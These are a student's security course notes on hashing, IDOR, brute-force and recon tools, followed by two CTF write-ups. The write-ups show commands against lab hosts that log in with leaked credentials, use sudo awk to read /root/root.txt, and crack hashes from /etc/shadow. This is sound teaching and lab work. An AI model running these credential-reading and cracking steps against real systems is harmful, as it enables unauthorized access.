# Day 13 — Attack Surface & Web Security Foundations
### Recon, Enumeration, Auth Flaws, IDOR, Hashing & Brute Force

**Date:** Saturday May 02, 2026

---

## 1. Encryption vs Hashing

### Encryption
Encryption is **two-way** — data is scrambled and can be recovered with the right key.

| Type | How it works | Examples |
|---|---|---|
| Symmetric | Same key encrypts & decrypts | AES, DES, Blowfish |
| Asymmetric | Public key encrypts, private key decrypts | RSA, ECC |

- Used for: data in transit (HTTPS/TLS), stored secrets, file encryption
- Key insight: if the key is compromised, the data is exposed

### Hashing
Hashing is **one-way** — a fixed-length digest, impossible to reverse mathematically.

```
Input → Hash Function → Digest (fixed length, irreversible)
"password" → MD5 → 5f4dcc3b5aa765d61d8327deb882cf99
```

| Algorithm | Output size | Status |
|---|---|---|
| MD5 | 128-bit / 32 hex chars | Broken — avoid for security |
| SHA-1 | 160-bit | Deprecated |
| SHA-256 | 256-bit | Secure, widely used |
| bcrypt | Variable | Designed for passwords (slow by design) |

**Why slow hashing matters for passwords:**
bcrypt/scrypt/Argon2 are intentionally slow → makes brute-forcing computationally expensive even if the hash leaks.

**Rainbow tables** — precomputed hash→plaintext lookups.
**Salting** — a random value appended to the input before hashing, defeats rainbow tables.

```
hash(password + salt) → unique digest even for identical passwords
```

---

## 2. Burp Suite Extensions

Burp Suite can be extended via the **BApp Store** (Extensions tab → BApp Store).

Useful extensions for web pentesting:

| Extension | Purpose |
|---|---|
| **AuthMatrix** | Map and test authorization across user roles |
| **IDOR Scanner** | Detect insecure direct object references |
| **Param Miner** | Discover hidden/unlinked parameters |
| **JWT Editor** | Decode, edit, and forge JWT tokens |
| **Turbo Intruder** | High-speed fuzzing (faster than built-in Intruder) |
| **Active Scan++** | Enhanced active scanning rules |
| **Logger++** | Full request/response logging across all tools |

**How to install:**
```
Burp → Extensions tab → BApp Store → search → Install
```

Custom extensions can also be written in Java, Python (via Jython), or Ruby (via JRuby).

---

## 3. Authorization: Vertical vs Horizontal

Authorization = what you are **allowed to do** after you're authenticated.

### Vertical Privilege Escalation
Accessing functionality meant for a **higher privilege role**.

```
Normal user → accesses /admin/panel → should be blocked
```

Example: a standard user calling an admin-only API endpoint by directly navigating to it or modifying a request.

### Horizontal Privilege Escalation
Accessing **another user's data** at the same privilege level.

```
User A (id=101) → accesses /profile?id=102 → views User B's data
```

Example: changing a numeric ID in a URL or request parameter to reach another user's records.

> Both are access control failures — the server trusts the client to only request what it's allowed to, which is wrong.

---

## 4. IDOR — Insecure Direct Object Reference

IDOR occurs when an application exposes internal object identifiers (IDs, filenames, keys) in user-controlled input without verifying that the requester is authorized to access that specific object.

### Classic Example
```
GET /api/invoice?id=1048
→ change to id=1049
→ you now see another user's invoice
```

The server used the raw ID from the request to query the database with no ownership check.

### Where to Look for IDOR

| Location | What to look for |
|---|---|
| URL parameters | `?id=`, `?user=`, `?order=`, `?doc=` |
| POST body (JSON/form) | `{"account_id": 12}` |
| Cookies | `user_id=`, `session_ref=` |
| HTTP headers | `X-User-ID`, `X-Account` |
| Hidden form fields | `<input type="hidden" name="uid" value="42">` |
| File paths | `/download/report_john.pdf` → try `/report_jane.pdf` |
| API responses | IDs leaked in JSON that can be replayed |

### Special IDOR Cases

**Encoded IDs** — IDs may be Base64 or hex encoded, not raw integers.
```bash
echo "dXNlcl8xMDI=" | base64 -d   # → user_102
# Change 102 → 103, re-encode, use in request
```

**GUIDs/UUIDs** — look random but may be:
- Predictable (sequential GUIDs)
- Leaked elsewhere in the app (other API responses, error messages, emails)

**Indirect references** — the ID may not map directly to a DB row; look for filenames, document references, queue names.

**State-based IDOR** — access an object that belongs to you, then change its state (e.g., submitted order → pending order of someone else).

**API versioning** — `/api/v2/user/102` is patched but `/api/v1/user/102` still vulnerable.

**Mass assignment** — sending extra JSON fields that the server blindly applies:
```json
{"name": "Alice", "role": "admin"}
```

---

## 5. UID and GID — and Is UID Safe?

### Linux UID / GID
- **UID** = User ID — a numeric identifier assigned to each user
- **GID** = Group ID — a numeric identifier assigned to each group
- Stored in `/etc/passwd` (UIDs) and `/etc/group` (GIDs)

```bash
id                    # shows your UID, GID, and all groups
id username           # shows another user's IDs
cat /etc/passwd       # UID:GID per line
```

| UID range | Meaning |
|---|---|
| 0 | root |
| 1–999 | System/service accounts |
| 1000+ | Regular users |

### Is UID Safe as an Identifier?

**No.** UIDs are predictable integers (1000, 1001, 1002...).
Using UID directly in web requests or cookies to identify users is an IDOR vulnerability waiting to happen.

Safe alternatives:
- UUIDs (v4, random)
- Server-side session tokens mapping to user identity
- Signed tokens (JWT with proper verification)

---

## 6. Brute Force — Tools & Techniques

### Crunch — Wordlist Generator
Generate custom wordlists based on character sets and length.

```bash
crunch <min> <max> <charset> [options]

crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789
# generates all 6–8 char combos from that set

crunch 8 8 -t Sofonyas@   # @ = lowercase, , = uppercase, % = digit, ^ = symbol
# generates "Sofonyas" + symbol combos
```

Output to file:
```bash
crunch 6 6 abc123 -o wordlist.txt
```

### John the Ripper — Password Cracker
Works on hashed passwords from `/etc/shadow`, zip files, PDFs, and more.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=md5crypt hash.txt           # specify hash type
john --show hash.txt                      # view cracked passwords
```

Unshadow (combine passwd + shadow for cracking):
```bash
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt
```

### Hashcat — GPU-Accelerated Hash Cracking
Faster than John, GPU-powered. Uses attack modes:

```bash
hashcat -m 0 hash.txt rockyou.txt         # -m 0 = MD5, dictionary attack
hashcat -m 1800 hash.txt rockyou.txt      # sha512crypt (/etc/shadow)
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a  # brute-force mode, 6 chars
hashcat -m 0 hash.txt -a 6 words.txt ?d?d # hybrid: word + 2 digits
```

Common `-m` values:
| Mode | Hash type |
|---|---|
| 0 | MD5 |
| 100 | SHA-1 |
| 1400 | SHA-256 |
| 1800 | sha512crypt (Linux shadow) |
| 3200 | bcrypt |

### Burp Suite Intruder — HTTP Brute Force
Automate parameter fuzzing and credential stuffing over HTTP.

Steps:
1. Capture login request in Proxy → Intercept
2. Send to Intruder (Ctrl+I)
3. Mark payload positions: `§username§` / `§password§`
4. Choose attack type:
   - **Sniper** — one position, one list
   - **Cluster Bomb** — multiple positions, multiple lists (full combo)
   - **Pitchfork** — multiple positions, lists iterated in parallel
5. Load wordlist → Start attack
6. Sort by response length or status to spot successful logins

> Note: Free Burp is rate-limited on Intruder. Use Turbo Intruder extension for speed.

---

## 7. Web Attack Surface — Recon & Enumeration

> From today's lecture slides (Week 3 — Information Gathering)

### Recon → Enumeration → Analysis

```
Passive Recon   →   Active Recon   →   Enumeration   →   Attack Surface Map
(no touching)       (probing)           (structured)        (actionable intel)
```

**Passive** — no direct target interaction:
- WHOIS lookups
- DNS records
- Search engines / Google dorking
- Sublist3r (queries public sources)
- Certificate transparency logs (crt.sh)

**Active** — direct interaction:
- Port scanning (Nmap)
- Directory brute-forcing (Gobuster, ffuf)
- Parameter fuzzing

### Web Attack Surface Components

| Surface | What to check |
|---|---|
| Domains & Subdomains | dev, api, admin, staging subdomains |
| Directories & Files | Hidden paths, backup files |
| Admin Panels | /admin, /dashboard, /manager |
| APIs | /api/v1/, /graphql |
| robots.txt | Lists disallowed paths → roadmap for attackers |
| Backup Paths | .bak, .old, .zip, ~, staging env |

### robots.txt — Not a Security Control
```
Disallow: /admin/
Disallow: /backup/
Disallow: /internal/
```
This tells crawlers what not to index. It tells attackers exactly what **exists**. Never rely on it for hiding sensitive paths.

---

## 8. Tools — Gobuster, Sublist3r, ffuf

### Gobuster — Directory Enumeration
```bash
# Basic scan
gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://target.local -w common.txt -x php,txt,html,bak

# With threads
gobuster dir -u http://target.local -w common.txt -t 20
```

Status codes to watch:
- `200` → file/page exists
- `301/302` → redirect (often a directory)
- `403` → forbidden but exists (worth noting)
- `404` → not found (default noise)

### Sublist3r — Passive Subdomain Discovery
```bash
sublist3r -d example.com
sublist3r -d example.com -o subdomains.txt
sublist3r -d example.com -t 20 -e google,bing,yahoo
```
Queries Google, Bing, Yahoo, VirusTotal, Netcraft, DNSdumpster — all passive, no direct target contact.

### ffuf — Flexible Fuzzer
The `FUZZ` keyword marks the injection point.

```bash
# Directory fuzzing
ffuf -u http://target.local/FUZZ -w common.txt

# Extension fuzzing
ffuf -u http://target.local/FUZZ.php -w common.txt

# Parameter discovery
ffuf -u http://target.local/index.php?FUZZ=test -w params.txt

# Filter noise by response size
ffuf -u http://target.local/FUZZ -w common.txt -fs 1234

# Match only specific status codes
ffuf -u http://target.local/FUZZ -w common.txt -mc 200,301
```

---

## 9. Real-World Ethical Hacking Workflow

```
1. SCOPE DEFINITION
   └── Get written authorization. Define IPs, domains, time window.

2. PASSIVE RECON
   └── WHOIS, DNS, crt.sh, Google dorking, Sublist3r
   └── Goal: map the org's internet-facing footprint without touching it

3. ACTIVE RECON
   └── Nmap port scan, service detection
   └── Gobuster/ffuf directory enumeration
   └── robots.txt, sitemap.xml review
   └── Goal: identify live services and hidden paths

4. VULNERABILITY IDENTIFICATION
   └── Manual browsing with Burp intercepting all traffic
   └── Look for: auth flaws, IDOR, exposed params, misconfigs
   └── Check for default creds, backup files, debug endpoints

5. EXPLOITATION (authorized)
   └── IDOR: manipulate object references
   └── Auth bypass: test vertical/horizontal escalation
   └── Brute force: Hydra/Burp Intruder on login forms
   └── Hash cracking: Hashcat/John on any leaked hashes

6. POST-EXPLOITATION (if in scope)
   └── Privilege escalation (sudo -l, SUID binaries, writable paths)
   └── Lateral movement
   └── Data exfiltration simulation

7. DOCUMENTATION & REPORTING
   └── Every step logged with timestamps and screenshots
   └── Map findings to CVSS severity
   └── Provide remediation steps for each finding
```

---

## 10. CTF Writeups

---

### Challenge 1 — `http://139.144.167.19` | Backup & Credentials Leak

**Objective:** Find exposed backup files, grab leaked creds, get root.

#### Step 1 — Directory Enumeration with ffuf
```bash
ffuf -u http://139.144.167.19/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
Found:
- `/backup/` → 301 redirect (directory listing enabled)
- `index.html`

#### Step 2 — Explore /backup/
Directory listing was on — no authentication, no restriction.
Found: `credentials.txt`

Content:
```
labuser:HttpL4b!
```

**Vulnerability:** Plaintext credentials stored in a web-accessible backup folder with directory listing enabled.

#### Step 3 — Port Scan
```bash
nmap http://139.144.167.19
```
Found: port `22/tcp` (SSH) open

#### Step 4 — SSH Login
```bash
ssh labuser@139.144.167.19
# password: HttpL4b!
```

#### Step 5 — User Flag
```bash
ls
cat user.txt
```
`flag{http_dir_listing_cred_leak}`

#### Step 6 — Privilege Escalation
```bash
sudo -l
# User can run /usr/bin/awk as root without password
```

`awk` can read files when run as root:
```bash
sudo awk '{print}' /root/root.txt
```
`flag{root_via_sudo_awk}`

**Key lessons:**
- Never store credentials in web-accessible directories
- Directory listing must be disabled (Apache: `Options -Indexes`)
- `sudo -l` is always the first priv-esc check
- `awk`, `vim`, `python`, `find` — many Unix tools can be abused for file read/shell when run as root via sudo (GTFOBins)

---

### Challenge 2 — `https://ftp-challenge1.onrender.com` | FTP Creds & Hash Cracking

**Objective:** Enumerate API endpoints, assemble credentials from split data, crack a hash, authenticate.

#### Step 1 — Directory Enumeration
```bash
ffuf -u https://ftp-challenge1.onrender.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
Discovered: `/auth`, `/backup`, `/config`, `/logs`, `/ftp`, `/Logs`

#### Step 2 — Probe Each Endpoint
```bash
curl https://ftp-challenge1.onrender.com/auth
# {"session":"ctf-session-2025","note":"Use this session token for /ftp."}

curl https://ftp-challenge1.onrender.com/backup
# {"ftp_user":"admin","ftp_pass":"password123"}   ← RED HERRING

curl https://ftp-challenge1.onrender.com/config
# {"part1":"sys"}

curl https://ftp-challenge1.onrender.com/logs
# {"part2":"admin","hash":"NTg1OGVhMjI4Y2MyZWRmODg3MjE2OTliMmM4NjM4ZTU="}
```

#### Step 3 — Decode the Hash (Base64 → hex → MD5)
```bash
echo "NTg1OGVhMjI4Y2MyZWRmODg3MjE2OTliMmM4NjM4ZTU=" | base64 -d
# 5858ea228cc2edf88721699b2c8638e5
```
This is an MD5 hash. Crack it via CrackStation / dCode.fr:
```
5858ea228cc2edf88721699b2c8638e5 → welcome123
```

Or with Hashcat:
```bash
echo "5858ea228cc2edf88721699b2c8638e5" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

#### Step 4 — Assemble the Username
`part1` = `sys` + `part2` = `admin` → username = `sysadmin`

#### Step 5 — Authenticate to /ftp
```bash
curl -X POST https://ftp-challenge1.onrender.com/ftp \
  -H "Content-Type: application/json" \
  -d '{"username":"sysadmin","password":"welcome123","session":"ctf-session-2025"}'
```

Response:
```json
{
  "message": "Login successful. Files available:",
  "files": ["flag.txt"],
  "flag": "CxC{m51sc0nf1gur3d_53rv3r}"
}
```

**Key lessons:**
- Credentials split across multiple endpoints — enumerate everything, correlate
- Red herrings (`/backup`) are common in real apps too (default creds left behind)
- Always test Base64 before assuming something is a raw hash
- MD5 is broken — `welcome123` cracked instantly from a hash DB
- Session tokens in `/auth` responses can be required for authenticated endpoints
- Proper fix: server-side session management, hashed+salted passwords (bcrypt), no credential fragments in API responses

---

## Quick Reference

```
Encryption:  two-way  →  AES (symmetric), RSA (asymmetric)
Hashing:     one-way  →  MD5 (broken), SHA-256, bcrypt (for passwords)
Salt:        random value prepended/appended before hashing (defeats rainbow tables)

Vertical escalation:    user → admin privilege
Horizontal escalation:  user A → user B's data (same privilege)
IDOR:                   server trusts client-supplied object ID without auth check

Brute force toolkit:
  Crunch      → generate wordlists
  John        → CPU hash cracking, supports many formats
  Hashcat     → GPU hash cracking, much faster
  Intruder    → HTTP parameter brute force via Burp

Recon toolkit:
  Sublist3r   → passive subdomain discovery
  Gobuster    → active directory/file brute force
  ffuf        → flexible fuzzer (dirs, params, extensions, vhosts)

robots.txt  → hints at hidden paths, NOT a security control
GTFOBins    → reference for sudo/SUID binary abuse → https://gtfobins.github.io
```
